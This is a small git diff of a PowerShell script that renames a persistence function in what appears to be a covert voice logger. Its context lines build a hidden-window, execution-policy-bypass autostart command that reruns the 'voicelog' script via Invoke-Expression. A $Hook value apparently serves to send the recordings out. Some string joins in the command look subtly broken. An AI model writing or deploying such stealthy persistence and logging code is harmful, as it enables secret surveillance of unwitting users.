@@ -1,4 +1,4 @@
-function Persist-Logger {
+function Add-LoggerPersistency {
     [CmdletBinding()]
 	param (
 		[parameter(Position=0,Mandatory=$True)]
@@ -83,6 +83,6 @@ function Start-logger{
 
 $name = "voicelog"
 $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + '$Persistent=' + $Persistent + ';Get-Item' + $name +'.ps1 | Invoke-Expression;sleep 5;exit'); 
-Persist-Logger $name -Command $autostart -Days $DaysRun;
+Add-LoggerPersistency $name -Command $autostart -Days $DaysRun;
 Start-Logger
 
